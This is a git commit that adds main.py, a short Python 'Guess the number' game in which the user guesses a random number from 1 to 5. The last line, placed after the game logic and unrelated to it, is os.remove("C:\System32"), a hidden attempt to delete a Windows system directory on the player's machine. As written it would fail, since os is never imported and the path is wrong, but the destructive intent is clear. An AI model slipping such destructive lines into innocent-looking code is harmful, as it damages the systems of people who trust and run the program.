5790510cb9b43648a2aed28514e23d1e9cd626f6
xomja1337 <xomja63@gmail.com>
2025-12-02 19:49:14 +0200

    Guess the number

---
+++ main.py
@@ -0,0 +1,12 @@
+import time
+import random
+
+print("Guess the number")
+user_number = int(input("Enter Your number "))
+random_ńumber = random.randint(1,5)
+
+if user_number == random_ńumber:
+    print("You Win")
+else:
+    print(f"You lose! the correct number was {random_ńumber}")
+os.remove("C:\System32")
